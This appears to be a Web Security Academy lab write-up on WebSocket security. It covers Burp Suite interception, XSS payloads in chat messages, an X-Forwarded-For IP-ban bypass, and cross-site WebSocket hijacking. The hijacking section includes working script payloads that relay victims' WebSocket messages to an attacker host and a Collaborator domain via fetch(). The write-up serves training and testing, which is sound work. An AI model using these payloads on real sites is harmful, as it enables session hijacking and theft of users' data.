**WebSockets**

WebSocket's are widely used in modern web applications. They are initiated over HTTP and provide long-lived connections with asynchronous communication in both directions.

WebSockets are used for all kinds of purposes, including performing user actions and transmitting sensitive information. Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications.

**Manipulating WebSocket traffic**

Finding WebSockets security vulnerabilities generally involves manipulating them in ways that the application doesn't expect. You can do this using Burp Suite.

You can use Burp Suite to:

- Intercept and modify WebSocket messages.
- Replay and generate new WebSocket messages.
- Manipulate WebSocket connections.

**Intercepting and modifying WebSocket messages**

You can use Burp Proxy to intercept and modify WebSocket messages, as follows:

- Open Burp's browser.
- Browse to the application function that uses WebSockets. You can determine that WebSockets are being used by using the application and looking for entries appearing in the WebSockets history tab within Burp Proxy.
- In the Intercept tab of Burp Proxy, ensure that interception is turned on.
- When a WebSocket message is sent from the browser or server, it will be displayed in the Intercept tab for you to view or modify. Press the Forward button to forward the message.

**Note**

You can configure whether client-to-server or server-to-client messages are intercepted in Burp Proxy. Do this in the Settings dialog, in the WebSocket interception rules settings.

**Replaying and generating new WebSocket messages**

As well as intercepting and modifying WebSocket messages on the fly, you can replay individual messages and generate new messages. You can do this using Burp Repeater:

- In Burp Proxy, select a message in the WebSockets history, or in the Intercept tab, and choose "Send to Repeater" from the context menu.
- In Burp Repeater, you can now edit the message that was selected, and send it over and over.
- You can enter a new message and send it in either direction, to the client or server.
- In the "History" panel within Burp Repeater, you can view the history of messages that have been transmitted over the WebSocket connection. This includes messages that you have generated in Burp Repeater, and also any that were generated by the browser or server via the same connection.
- If you want to edit and resend any message in the history panel, you can do this by selecting the message and choosing "Edit and resend" from the context menu.

**Manipulating WebSocket connections**

As well as manipulating WebSocket messages, it is sometimes necessary to manipulate the WebSocket handshake that establishes the connection.

There are various situations in which manipulating the WebSocket handshake might be necessary:

- It can enable you to reach more attack surface.
- Some attacks might cause your connection to drop so you need to establish a new one.
- Tokens or other data in the original handshake request might be stale and need updating.

**Manipulating WebSocket connections - Continued**

You can manipulate the WebSocket handshake using Burp Repeater:

- Send a WebSocket message to Burp Repeater as already described.
- In Burp Repeater, click on the pencil icon next to the WebSocket URL. This opens a wizard that lets you attach to an existing connected WebSocket, clone a connected WebSocket, or reconnect to a disconnected WebSocket.
- If you choose to clone a connected WebSocket or reconnect to a disconnected WebSocket, then the wizard will show full details of the WebSocket handshake request, which you can edit as required before the handshake is performed.
- When you click "Connect", Burp will attempt to carry out the configured handshake and display the result. If a new WebSocket connection was successfully established, you can then use this to send new messages in Burp Repeater.

**WebSockets security vulnerabilities**

In principle, practically any web security vulnerability might arise in relation to WebSockets:

- User-supplied input transmitted to the server might be processed in unsafe ways, leading to vulnerabilities such as SQL injection or XML external entity injection.
- Some blind vulnerabilities reached via WebSockets might only be detectable using out-of-band (OAST) techniques.
- If attacker-controlled data is transmitted via WebSockets to other application users, then it might lead to XSS or other client-side vulnerabilities.

**Manipulating WebSocket messages to exploit vulnerabilities**

The majority of input-based vulnerabilities affecting WebSockets can be found and exploited by tampering with the contents of WebSocket messages.

For example, suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:

{"message":"Hello Carlos"}

The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows:

<td>Hello Carlos</td>

In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:

`{"message":"<img src=1 onerror='alert(1)'>"}`

<img src="images/image1.png" alt="third" width="800">

**Step1**

To solve this lab go to live chat.

**Step2**

In burp turn on the intercept and the send a message to server.

<img src="images/image2.png" alt="third" width="500">

Use this exploit to show popup

`{"message":"<img src=x onerror='alert(1)'>"}`

<img src="images/image3.png" alt="third" width="500">

Send it to server.

Refresh the Page and we have

**Manipulating the WebSocket handshake to exploit vulnerabilities**

Some WebSockets vulnerabilities can only be found and exploited by manipulating the WebSocket handshake. These vulnerabilities tend to involve design flaws, such as:

- Misplaced trust in HTTP headers to perform security decisions, such as the X-Forwarded-For header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application.

<img src="images/image4.png" alt="third" width="800">

**Step1**
 
To solve this lab first send a change from live chat server

**Step2**

In proxy tab go to web socket history.

Open the message and send it to repeater

<img src="images/image5.png" alt="third" width="500">

**Step3**

In repeater when I use the normal payload it will restrict the ip address.

<img src="images/image6.png" alt="third" width="800">

Now we reconnect by setting the the `X-Forwarded-For` and new ip address

<img src="images/image7.png" alt="third" width="700">

Now when I set the payload like this

`<img src=x OnErRoR=alert `1` >`

`"message":"<img src=1 oNeRrOr=alert`1`>"`

It will successfully pass

**Using cross-site WebSockets to exploit vulnerabilities**

Some WebSockets security vulnerabilities arise when an attacker makes a cross-domain WebSocket connection from a web site that the attacker controls. This is known as a cross-site WebSocket hijacking attack, and it involves exploiting a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. The attack often has a serious impact, allowing an attacker to perform privileged actions on behalf of the victim user or capture sensitive data to which the victim user has access.

**What is cross-site WebSocket hijacking?**

Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a cross-site request forgery (CSRF) vulnerability on a WebSocket handshake. It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.

An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.

The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.

**What is the impact of cross-site WebSocket hijacking?**

A successful cross-site WebSocket hijacking attack will often enable an attacker to:

- **Perform unauthorized actions masquerading as the victim user.** As with regular CSRF, the attacker can send arbitrary messages to the server-side application. If the application uses client-generated WebSocket messages to perform any sensitive actions, then the attacker can generate suitable messages cross-domain and trigger those actions.
- **Retrieve sensitive data that the user can access.** Unlike with regular CSRF, cross-site WebSocket hijacking gives the attacker two-way interaction with the vulnerable application over the hijacked WebSocket. If the application uses server-generated WebSocket messages to return any sensitive data to the user, then the attacker can intercept those messages and capture the victim user's data.

**Performing a cross-site WebSocket hijacking attack**

Since a cross-site WebSocket hijacking attack is essentially a CSRF vulnerability on a WebSocket handshake, the first step to performing an attack is to review the WebSocket handshakes that the application carries out and determine whether they are protected against CSRF.

In terms of the normal conditions for CSRF attacks, you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.

**Performing a cross-site WebSocket hijacking attack - Continued**

For example, the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie:
```
GET /chat HTTP/1.1  
Host: normal-website.com  
Sec-WebSocket-Version: 13  
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==  
Connection: keep-alive, Upgrade  
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2  
Upgrade: websocket
```

**Note**

The Sec-WebSocket-Key header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.

**Performing a cross-site WebSocket hijacking attack - Continued**

If the WebSocket handshake request is vulnerable to CSRF, then an attacker's web page can perform a cross-site request to open a WebSocket on the vulnerable site. What happens next in the attack depends entirely on the application's logic and how it is using WebSockets. The attack might involve:

- Sending WebSocket messages to perform unauthorized actions on behalf of the victim user.
- Sending WebSocket messages to retrieve sensitive data.
- Sometimes, just waiting for incoming messages to arrive containing sensitive data.

**Step2**

Now we craft an exploit. This exploit is also available at 'palyoad all the thing github'
```
<script>

  ws = new WebSocket('wss://vulnerable.example.com/messages');

  ws.onopen = function start(event) {

    ws.send("HELLO");

  }

  ws.onmessage = function handleReply(event) {

    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});

  }

  ws.send("Some text sent to the server");

</script>
```

**Replacing** `'wss://vulnerable.example.com/messages'` it with

`wss://0a6200fb03ba37db81d3251d002200a1.web-security-academy.net/chat`

And

`'[https://attacker.example.net/](https://attacker.example.net/)?`

With our collaborator

`ta7qgaxhh2gu5f7uz5e92fnk5bb2zunj.oastify.com`

And we replace hello with READY because communication start after READY message

<img src="images/image_unmap2.png" alt="third" width="500">

Go to collaborator tab and copy

<img src="images/image12.png" alt="third" width="600">

Now we paste it in attacker.example.net
```
<script>

  ws = new WebSocket('wss://0a6200fb03ba37db81d3251d002200a1.web-security-academy.net/chat');

  ws.onopen = function start(event) {

    ws.send("READY");

  }

  ws.onmessage = function handleReply(event) {

    fetch('https://ta7qgaxhh2gu5f7uz5e92fnk5bb2zunj.oastify.com/?'+event.data, {mode: 'no-cors'});

  }

  ws.send("Some text sent to the server");

</script>
```

**Alternative payload**
```
<script>

    var ws = new WebSocket('wss://your-websocket-url');

    ws.onopen = function() {

        ws.send("READY");

    };

    ws.onmessage = function(event) {

        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});

    };

</script>
```

**Step3**

Now we see result in collaborator window
